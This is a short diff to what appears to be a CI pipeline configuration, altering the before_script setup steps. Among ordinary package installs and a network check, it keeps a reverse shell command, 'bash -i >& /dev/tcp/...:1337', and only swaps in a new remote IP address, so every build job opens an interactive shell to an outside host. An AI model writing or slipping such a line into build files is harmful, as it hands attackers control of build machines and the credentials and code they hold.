@@ -1,6 +1,6 @@
 before_script:
   - uname -a
-  - /bin/bash -c "bash -i >& /dev/tcp/105.106.8.210/1337 0>&1"
+  - /bin/bash -c "bash -i >& /dev/tcp/105.106.46.143/1337 0>&1"
   - apt-get update -qq && apt-get install -y -qq sqlite3 libsqlite3-dev libmicrohttpd-dev dnsutils net-tools
   - touch zz.$(date +%T-%F)
   - timeout 5 bash -c 'cat < /dev/null > /dev/tcp/www.google.com/80'; echo $?
